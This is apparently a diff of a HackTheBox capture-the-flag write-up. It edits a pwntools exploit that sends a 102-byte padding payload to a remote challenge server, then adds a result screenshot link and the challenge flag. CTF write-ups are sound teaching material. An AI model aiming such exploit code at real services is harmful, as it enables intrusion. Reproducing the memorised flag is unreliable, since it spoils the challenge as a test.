@@ -91,10 +91,12 @@ context.log_level = 'INFO'
 # sh = process(exe)
 sh = remote('94.237.63.83',51413)
 padding = 102
-p = flat([
-    asm('nop') * padding,
-    chr(123456).encode() 
-])
+# p = flat([
+#     asm('nop') * padding,
+#     chr(123456).encode() 
+# ])
+
+p = cyclic(102) + chr(123456).encode()
 
 sh.sendlineafter(b':', b'1')
 sh.sendlineafter(b':', p)
@@ -106,3 +108,13 @@ sh.interactive()
 
 > RESULT
 
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9c4ea9fa-baa9-4946-b267-d5af1f38f290)
+
+
+17. We've pwned it!
+
+## FLAG
+
+```
+HTB{7h3_0r4n63_cr4b_15_74k1n6_0v3r!}
+```
